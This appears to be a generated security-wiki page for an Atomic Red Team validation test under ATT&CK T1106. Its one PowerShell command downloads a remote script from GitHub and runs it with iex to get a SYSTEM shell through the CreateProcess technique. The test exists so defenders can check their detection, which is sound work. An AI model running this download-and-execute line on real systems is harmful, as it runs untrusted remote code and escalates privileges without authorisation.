---
atomic_guid: "ce4e76e6-de70-4392-9efe-b281fc2b4087"
title: "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique"
framework: "atomic"
generated: "true"
attack_technique_id: "T1106"
attack_technique_name: "Native API"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "ce4e76e6-de70-4392-9efe-b281fc2b4087"
  - "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique

Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn

## Metadata

- Atomic GUID: ce4e76e6-de70-4392-9efe-b281fc2b4087
- Technique: T1106: Native API
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1106/T1106.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1106-native_api|T1106]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.yaml)
